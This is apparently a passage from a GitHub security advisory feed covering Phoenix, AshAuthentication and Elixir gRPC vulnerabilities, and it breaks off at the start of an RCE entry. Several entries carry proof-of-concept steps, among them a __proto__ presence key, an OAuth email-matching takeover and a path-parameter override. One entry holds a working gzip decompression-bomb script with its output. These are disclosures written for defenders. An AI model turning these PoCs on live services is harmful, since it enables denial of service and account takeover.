<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ash_authentication] AshAuthentication vulnerable to OAuth2/OIDC account takeover via email-based user matching]]></title>
        <id>https://github.com/advisories/GHSA-777c-2fxx-qr28</id>
        <link href="https://github.com/advisories/GHSA-777c-2fxx-qr28"/>
        <updated>2026-08-25T18:20:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>AshAuthentication's OAuth2 and OIDC family strategies matched the local user by email address rather than by the OpenID Connect <code>iss</code>/<code>sub</code> claim combination. A provider login presenting a victim's email (including an unverified, reused, or <code>email_verified: false</code> account) resolved to and signed in as the victim's existing local account. An unauthenticated attacker who can register an account on any accepted OAuth provider with the victim's email obtains the victim's full local privileges.</p>
<h3 id="details">Details</h3>
<p>Per OpenID Connect Core §5.7, only the <code>iss</code>/<code>sub</code> claim combination uniquely and stably identifies an end-user; any other claim, including <code>email</code>, MUST NOT be used as a unique identifier. AshAuthentication's OAuth2/OIDC register flow nonetheless drove the upsert by the email field (<code>upsert_identity</code> on email, or a user-defined sign-in filter), and the sign-in preparation filtered users by email.</p>
<p><strong>1. Provider login.</strong> The attacker signs in to a configured OAuth/OIDC provider with the victim's email. This is trivial for providers that don't verify email ownership, and possible under email-reuse / reclamation for providers that do.</p>
<p><strong>2. AshAuthentication register step.</strong> <code>'Elixir.AshAuthentication.Strategy.OAuth2.IdentityChange':change/3</code> invokes the upsert action whose <code>upsert_identity</code> resolves on the email. The action lands on the victim's existing record.</p>
<p><strong>3. Sign-in preparation.</strong> <code>'Elixir.AshAuthentication.Strategy.OAuth2.SignInPreparation':prepare/3</code> does not verify the returned user against an <code>iss</code>/<code>sub</code> identity, so the attacker is authenticated as the victim.</p>
<h4 id="configurations">Configurations</h4>
<p>Exploitation requires one of:</p>
<ul>
<li>The configured OAuth/OIDC provider does not reliably verify email ownership (lets a user register with any email, or fails to verify it). Many social/enterprise providers fall into this category, including Slack, generic OIDC deployments, and any custom OAuth2 endpoint without strict email validation.</li>
<li>The provider allows email reclamation: the victim's email becomes available on the provider (account deletion, organisation off-boarding, mail-host change) and the attacker registers it. The attacker then signs in via that provider and takes over the local account.</li>
</ul>
<p>Providers that strictly verify email ownership and forbid reuse (e.g. modern Google Workspace, GitHub for accounts that have completed verification) are not directly exploitable, but applications that accept any of the affected strategy types in addition are still exposed via the weaker providers in the set.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>On any accepted OAuth/OIDC provider, register an account whose email is the victim's email (or use a provider that allows email reuse).</li>
<li>Complete the standard OAuth flow against the AshAuthentication application.</li>
<li>The application's upsert resolves on email, signs the attacker in as the victim, and returns a session token for the victim's account.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Unauthenticated remote account takeover against any AshAuthentication-using application that exposes an OAuth2/OIDC strategy. The default configuration of every affected strategy is vulnerable; no application-level misconfiguration is required. An attacker who succeeds gains the victim's full local identity, with read, write, and destructive access to whatever the victim's account can do.</p>
<h2 id="references">References</h2>
<ul>
<li>Introduction commit: <a href="https://github.com/team-alembic/ash_authentication/commit/c5f589058e04239263f50a1430eb17ea6d5dd1a2">https://github.com/team-alembic/ash_authentication/commit/c5f589058e04239263f50a1430eb17ea6d5dd1a2</a></li>
<li>Patch commit (4.x backport): <a href="https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d">https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d</a></li>
<li>Patch commit (5.x): <a href="https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7">https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/team-alembic/ash_authentication/security/advisories/GHSA-777c-2fxx-qr28">https://github.com/team-alembic/ash_authentication/security/advisories/GHSA-777c-2fxx-qr28</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49757">https://nvd.nist.gov/vuln/detail/CVE-2026-49757</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7">https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d">https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-49757.html">https://cna.erlef.org/cves/CVE-2026-49757.html</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/releases/tag/v4.14.0">https://github.com/team-alembic/ash_authentication/releases/tag/v4.14.0</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/releases/tag/v5.0.0-rc.10">https://github.com/team-alembic/ash_authentication/releases/tag/v5.0.0-rc.10</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-49757">https://osv.dev/vulnerability/EEF-CVE-2026-49757</a></li>
<li><a href="https://github.com/advisories/GHSA-777c-2fxx-qr28">https://github.com/advisories/GHSA-777c-2fxx-qr28</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-777c-2fxx-qr28</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-25T18:20:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ash_authentication] AshAuthentication vulnerable to OAuth2/OIDC account takeover via email-based user matching]]></title>
        <id>https://github.com/advisories/GHSA-777c-2fxx-qr28</id>
        <link href="https://github.com/advisories/GHSA-777c-2fxx-qr28"/>
        <updated>2026-08-25T18:20:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>AshAuthentication's OAuth2 and OIDC family strategies matched the local user by email address rather than by the OpenID Connect <code>iss</code>/<code>sub</code> claim combination. A provider login presenting a victim's email (including an unverified, reused, or <code>email_verified: false</code> account) resolved to and signed in as the victim's existing local account. An unauthenticated attacker who can register an account on any accepted OAuth provider with the victim's email obtains the victim's full local privileges.</p>
<h3 id="details">Details</h3>
<p>Per OpenID Connect Core §5.7, only the <code>iss</code>/<code>sub</code> claim combination uniquely and stably identifies an end-user; any other claim, including <code>email</code>, MUST NOT be used as a unique identifier. AshAuthentication's OAuth2/OIDC register flow nonetheless drove the upsert by the email field (<code>upsert_identity</code> on email, or a user-defined sign-in filter), and the sign-in preparation filtered users by email.</p>
<p><strong>1. Provider login.</strong> The attacker signs in to a configured OAuth/OIDC provider with the victim's email. This is trivial for providers that don't verify email ownership, and possible under email-reuse / reclamation for providers that do.</p>
<p><strong>2. AshAuthentication register step.</strong> <code>'Elixir.AshAuthentication.Strategy.OAuth2.IdentityChange':change/3</code> invokes the upsert action whose <code>upsert_identity</code> resolves on the email. The action lands on the victim's existing record.</p>
<p><strong>3. Sign-in preparation.</strong> <code>'Elixir.AshAuthentication.Strategy.OAuth2.SignInPreparation':prepare/3</code> does not verify the returned user against an <code>iss</code>/<code>sub</code> identity, so the attacker is authenticated as the victim.</p>
<h4 id="configurations">Configurations</h4>
<p>Exploitation requires one of:</p>
<ul>
<li>The configured OAuth/OIDC provider does not reliably verify email ownership (lets a user register with any email, or fails to verify it). Many social/enterprise providers fall into this category, including Slack, generic OIDC deployments, and any custom OAuth2 endpoint without strict email validation.</li>
<li>The provider allows email reclamation: the victim's email becomes available on the provider (account deletion, organisation off-boarding, mail-host change) and the attacker registers it. The attacker then signs in via that provider and takes over the local account.</li>
</ul>
<p>Providers that strictly verify email ownership and forbid reuse (e.g. modern Google Workspace, GitHub for accounts that have completed verification) are not directly exploitable, but applications that accept any of the affected strategy types in addition are still exposed via the weaker providers in the set.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>On any accepted OAuth/OIDC provider, register an account whose email is the victim's email (or use a provider that allows email reuse).</li>
<li>Complete the standard OAuth flow against the AshAuthentication application.</li>
<li>The application's upsert resolves on email, signs the attacker in as the victim, and returns a session token for the victim's account.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Unauthenticated remote account takeover against any AshAuthentication-using application that exposes an OAuth2/OIDC strategy. The default configuration of every affected strategy is vulnerable; no application-level misconfiguration is required. An attacker who succeeds gains the victim's full local identity, with read, write, and destructive access to whatever the victim's account can do.</p>
<h2 id="references">References</h2>
<ul>
<li>Introduction commit: <a href="https://github.com/team-alembic/ash_authentication/commit/c5f589058e04239263f50a1430eb17ea6d5dd1a2">https://github.com/team-alembic/ash_authentication/commit/c5f589058e04239263f50a1430eb17ea6d5dd1a2</a></li>
<li>Patch commit (4.x backport): <a href="https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d">https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d</a></li>
<li>Patch commit (5.x): <a href="https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7">https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/team-alembic/ash_authentication/security/advisories/GHSA-777c-2fxx-qr28">https://github.com/team-alembic/ash_authentication/security/advisories/GHSA-777c-2fxx-qr28</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49757">https://nvd.nist.gov/vuln/detail/CVE-2026-49757</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7">https://github.com/team-alembic/ash_authentication/commit/64530644f9b37ebb76ca14aeb83a77597a0034b7</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d">https://github.com/team-alembic/ash_authentication/commit/728b8d28c1b5f465fa1116ef044a815300fc733d</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-49757.html">https://cna.erlef.org/cves/CVE-2026-49757.html</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/releases/tag/v4.14.0">https://github.com/team-alembic/ash_authentication/releases/tag/v4.14.0</a></li>
<li><a href="https://github.com/team-alembic/ash_authentication/releases/tag/v5.0.0-rc.10">https://github.com/team-alembic/ash_authentication/releases/tag/v5.0.0-rc.10</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-49757">https://osv.dev/vulnerability/EEF-CVE-2026-49757</a></li>
<li><a href="https://github.com/advisories/GHSA-777c-2fxx-qr28">https://github.com/advisories/GHSA-777c-2fxx-qr28</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-777c-2fxx-qr28</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-25T18:20:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grpc] gRPC Erlang package has unbounded gzip decompression (decompression bomb)]]></title>
        <id>https://github.com/advisories/GHSA-6ccx-9c9f-327w</id>
        <link href="https://github.com/advisories/GHSA-6ccx-9c9f-327w"/>
        <updated>2026-08-25T18:12:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unauthenticated remote peer can crash any gRPC server built on this library by sending a small gzip-compressed frame that decompresses to gigabytes, exhausting the BEAM node's heap and triggering an OOM kill (denial of service).</p>
<p>Introduced in <a href="https://github.com/elixir-grpc/grpc/commit/beae6800fc8baf126f3fe7107d86a50e105275ba">https://github.com/elixir-grpc/grpc/commit/beae6800fc8baf126f3fe7107d86a50e105275ba</a></p>
<h3 id="details">Details</h3>
<p><code>GRPC.Compressor.Gzip.decompress/1</code> (lib/grpc/compressor/gzip.ex:12-14) calls <code>:zlib.gunzip/1</code> directly on attacker-controlled bytes with no size limit, no ratio check, and no incremental decoding. Because this module is registered as a <code>GRPC.Compressor</code> implementation, it is invoked automatically whenever an incoming gRPC frame carries <code>grpc-encoding: gzip</code>. <code>:zlib.gunzip/1</code> allocates the entire decompressed result as a single binary before returning, so a highly compressible payload (e.g. a few kilobytes of zeros, which gzip compresses at roughly 1000:1) expands to multiple gigabytes inside a single function call. The server's <code>max_receive_message_length</code> is enforced only against the already-decompressed message, so it provides no protection here. A single request is sufficient to OOM-kill the node.</p>
<h3 id="poc">PoC</h3>
<p>A script that verifies the vulnerability is attached to the end of this report. Run it against a stock gRPC server using this library; the BEAM node's memory usage will balloon and the VM will be OOM-killed after a single request.</p>
<h3 id="impact">Impact</h3>
<p>This is a decompression bomb / denial-of-service vulnerability. Any service that exposes a gRPC endpoint built on this library and accepts gzip-compressed requests is affected. No authentication, prior state, or special configuration is required — the attacker only needs to be able to reach the gRPC port and send a single crafted frame with <code>grpc-encoding: gzip</code>.</p>
<h2 id="scripts-and-logs">Scripts and Logs</h2>
<pre><code class="language-elixir"># Verifies: Unbounded gzip decompression (decompression bomb)

Mix.install([{:grpc, "~&gt; 0.9"}])

# Build a gzip bomb: 200 MB of zeros compresses to roughly a few hundred KB.
uncompressed_size = 200 * 1024 * 1024
bomb_payload = :zlib.gzip(:binary.copy(&lt;&lt;0&gt;&gt;, uncompressed_size))

# Wrap the bomb in a gRPC length-prefixed frame with the "compressed" flag (1)
# set. This is the exact wire shape an outside peer would put on the socket
# for a `grpc-encoding: gzip` message.
frame =
  &lt;&lt;1, byte_size(bomb_payload)::unsigned-integer-32, bomb_payload::binary&gt;&gt;

IO.puts(
  "Compressed bomb: #{byte_size(bomb_payload)} bytes -&gt; claims to expand to #{uncompressed_size} bytes"
)

:erlang.garbage_collect()
mem_before = :erlang.memory(:total)
IO.puts("Memory before: #{div(mem_before, 1024 * 1024)} MB")

# Public entry point: GRPC.Message.from_data/2 is what the server's request
# handling pipeline calls with the raw bytes pulled off an incoming HTTP/2
# DATA frame, once it has resolved the encoding header to a compressor module.
# An outside attacker controls `frame`; the library is the trust boundary.
{:ok, decompressed} =
  GRPC.Message.from_data(%{compressor: GRPC.Compressor.Gzip}, frame)

mem_after = :erlang.memory(:total)
IO.puts("Memory after:  #{div(mem_after, 1024 * 1024)} MB")
IO.puts("Delta:         #{div(mem_after - mem_before, 1024 * 1024)} MB")
IO.puts("Decompressed binary size: #{byte_size(decompressed)} bytes")

amplification = byte_size(decompressed) / byte_size(bomb_payload)
IO.puts("Amplification ratio: ~#{Float.round(amplification, 1)}x")

if byte_size(decompressed) == uncompressed_size do
  IO.puts(
    "VERIFIED: GRPC.Message.from_data/2 fully expanded the gzip bomb with no size cap, growing heap by ~#{div(mem_after - mem_before, 1024 * 1024)} MB from a #{div(byte_size(bomb_payload), 1024)} KB attacker payload."
  )
else
  IO.puts("NOT VERIFIED: decompressed size did not match expected payload")
end
</code></pre>
<pre><code class="language-logs">Compressed bomb: 203860 bytes -&gt; claims to expand to 209715200 bytes
Memory before: 45 MB
Memory after:  403 MB
Delta:         358 MB
Decompressed binary size: 209715200 bytes
Amplification ratio: ~1028.7x
VERIFIED: GRPC.Message.from_data/2 fully expanded the gzip bomb with no size cap, growing heap by ~358 MB from a 199 KB attacker payload.
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/elixir-grpc/grpc/security/advisories/GHSA-6ccx-9c9f-327w">https://github.com/elixir-grpc/grpc/security/advisories/GHSA-6ccx-9c9f-327w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53430">https://nvd.nist.gov/vuln/detail/CVE-2026-53430</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/pull/543">https://github.com/elixir-grpc/grpc/pull/543</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/commit/1afbab9d57d2a3e16ca9c62ffa4923338ea96cfc">https://github.com/elixir-grpc/grpc/commit/1afbab9d57d2a3e16ca9c62ffa4923338ea96cfc</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-53430.html">https://cna.erlef.org/cves/CVE-2026-53430.html</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0">https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-53430">https://osv.dev/vulnerability/EEF-CVE-2026-53430</a></li>
<li><a href="https://github.com/advisories/GHSA-6ccx-9c9f-327w">https://github.com/advisories/GHSA-6ccx-9c9f-327w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6ccx-9c9f-327w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:12:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grpc] gRPC Erlang package has unbounded request body accumulation in `read_full_body/3`]]></title>
        <id>https://github.com/advisories/GHSA-q8gf-9rvj-gmgj</id>
        <link href="https://github.com/advisories/GHSA-q8gf-9rvj-gmgj"/>
        <updated>2026-08-25T18:12:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>'Elixir.GRPC.Server.Adapters.Cowboy.Handler':read_full_body/3</code> accumulates every received chunk into a single growing binary with no size cap. When the client omits the <code>grpc-timeout</code> header, the read timeout resolves to <code>:infinity</code>, allowing a slow-trickle attacker to hold the connection open indefinitely while memory grows. A single unauthenticated connection is sufficient to exhaust BEAM memory and crash the node.</p>
<h3 id="details">Details</h3>
<p>The read loop in <code>lib/grpc/server/adapters/cowboy/handler.ex</code> calls <code>:cowboy_req.read_body/2</code> in a recursive loop, concatenating each chunk: <code>body &lt;&gt; data</code>. There is no running-total check and no configurable maximum body size. As the loop drains the receive buffer, cowboy issues fresh HTTP/2 <code>WINDOW_UPDATE</code> frames, so the client can keep pushing data indefinitely.</p>
<p>The <code>grpc-timeout</code> header is attacker-supplied and optional. When absent, <code>timeout_left_opt(nil)</code> returns <code>:infinity</code>, so the per-chunk read also has no deadline. The two missing controls compound: a fast client can blast multi-gigabyte payloads directly into memory; a slow client can trickle data forever.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start any <code>grpc</code> server exposing a unary RPC (no special configuration required).</li>
<li>Open an HTTP/2 connection and send a POST to any unary RPC path with <code>Content-Type: application/grpc+proto</code> — omit the <code>grpc-timeout</code> header.</li>
<li>Stream a large body (e.g. 1 GiB) in chunks without sending the final <code>END_STREAM</code> flag immediately.</li>
<li>Observe BEAM memory growing proportionally to uploaded data with no server-side cap.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Affects <code>grpc</code> ≥ 0.3.1. No authentication, no special configuration, and no specific RPC method required, the unbounded read is on the default unary ingress path.</p>
<h3 id="references">References</h3>
<ul>
<li>Introduction commit: <a href="https://github.com/elixir-grpc/grpc/commit/d1abe70a6cad6dac4a3f8235d883d7c896989560">https://github.com/elixir-grpc/grpc/commit/d1abe70a6cad6dac4a3f8235d883d7c896989560</a></li>
<li>Patch commit: <a href="https://github.com/elixir-grpc/grpc/commit/49e18c3ec6bb9afe2f712caad3dbab5c56a68a00">https://github.com/elixir-grpc/grpc/commit/49e18c3ec6bb9afe2f712caad3dbab5c56a68a00</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/elixir-grpc/grpc/security/advisories/GHSA-q8gf-9rvj-gmgj">https://github.com/elixir-grpc/grpc/security/advisories/GHSA-q8gf-9rvj-gmgj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48854">https://nvd.nist.gov/vuln/detail/CVE-2026-48854</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/pull/542">https://github.com/elixir-grpc/grpc/pull/542</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/commit/49e18c3ec6bb9afe2f712caad3dbab5c56a68a00">https://github.com/elixir-grpc/grpc/commit/49e18c3ec6bb9afe2f712caad3dbab5c56a68a00</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-48854.html">https://cna.erlef.org/cves/CVE-2026-48854.html</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0">https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-48854">https://osv.dev/vulnerability/EEF-CVE-2026-48854</a></li>
<li><a href="https://github.com/advisories/GHSA-q8gf-9rvj-gmgj">https://github.com/advisories/GHSA-q8gf-9rvj-gmgj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8gf-9rvj-gmgj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:12:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grpc] gRPC Erlang package's path bindings are overridable by query string and request body]]></title>
        <id>https://github.com/advisories/GHSA-mwr4-5g34-j5cq</id>
        <link href="https://github.com/advisories/GHSA-mwr4-5g34-j5cq"/>
        <updated>2026-08-25T18:11:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the HTTP-to-gRPC transcoding layer of the <code>grpc</code> Hex package, query-string and request-body parameters can silently overwrite path-bound fields when building the decoded protobuf request struct. An authenticated attacker who can reach a transcoded endpoint can substitute any path-bound identifier (e.g. <code>user_id</code> from <code>/users/{user_id}/profile</code>) with an arbitrary value, bypassing authorization, multi-tenancy, and ownership checks that rely on the path-derived field.</p>
<h3 id="details">Details</h3>
<p>All three clauses of <code>GRPC.Server.Transcode.map_request/5</code> (<code>grpc_server/lib/grpc/server/transcode.ex</code>) use <code>Map.merge/2</code> with path bindings as the first argument, giving them the lowest merge precedence. Path bindings are extracted by the router from the matched URL template and should be the authoritative resource identifiers, but query-string and body parameters overwrite them. The decoded protobuf struct handed to the handler carries the attacker's value instead of the router's.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Deploy a transcoded gRPC service with a route like <code>GET /users/{user_id}/profile</code> where the handler authorizes access based on <code>request.user_id</code>.</li>
<li>Send: <code>GET /users/me/profile?user_id=victim</code></li>
<li>The decoded request struct has <code>user_id = "victim"</code> — the authorization check passes for the victim's resource, not the caller's.</li>
<li>Alternatively, for a <code>POST</code> with <code>body: "*"</code>: send <code>{"user_id": "victim"}</code> in the JSON body.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Affects applications using <code>grpc</code> ≥ 0.8.0 with HTTP transcoding enabled that rely on path-bound fields for authorization or tenant isolation. Fixed in 1.0.0. An authenticated attacker can read or modify any other user's resources exposed via transcoded endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li>Introduction commit: <a href="https://github.com/elixir-grpc/grpc/commit/8aaf3d3a8c4c7b08ac65e9c6f254e0d24da1d048">https://github.com/elixir-grpc/grpc/commit/8aaf3d3a8c4c7b08ac65e9c6f254e0d24da1d048</a></li>
<li>Patch commit: <a href="https://github.com/elixir-grpc/grpc/commit/33b6a095dbc91c6dee3c7b90893d7d74952e82e4">https://github.com/elixir-grpc/grpc/commit/33b6a095dbc91c6dee3c7b90893d7d74952e82e4</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/elixir-grpc/grpc/security/advisories/GHSA-mwr4-5g34-j5cq">https://github.com/elixir-grpc/grpc/security/advisories/GHSA-mwr4-5g34-j5cq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48599">https://nvd.nist.gov/vuln/detail/CVE-2026-48599</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/pull/541">https://github.com/elixir-grpc/grpc/pull/541</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/commit/33b6a095dbc91c6dee3c7b90893d7d74952e82e4">https://github.com/elixir-grpc/grpc/commit/33b6a095dbc91c6dee3c7b90893d7d74952e82e4</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-48599.html">https://cna.erlef.org/cves/CVE-2026-48599.html</a></li>
<li><a href="https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0">https://github.com/elixir-grpc/grpc/releases/tag/v1.0.0</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-48599">https://osv.dev/vulnerability/EEF-CVE-2026-48599</a></li>
<li><a href="https://github.com/advisories/GHSA-mwr4-5g34-j5cq">https://github.com/advisories/GHSA-mwr4-5g34-j5cq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwr4-5g34-j5cq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:11:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grpc] gRPC Erlang package vulnerable to Remote Code Execution with attacker-controlled gRPC payloads]]></title>
        <id>https://github.com/advisories/GHSA-grp7-v8xh-rj7h</id>
        <link href="https://github.com/advisories/GHSA-grp7-v8xh-rj7h"/>
        <updated>2026-08-25T18:09:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
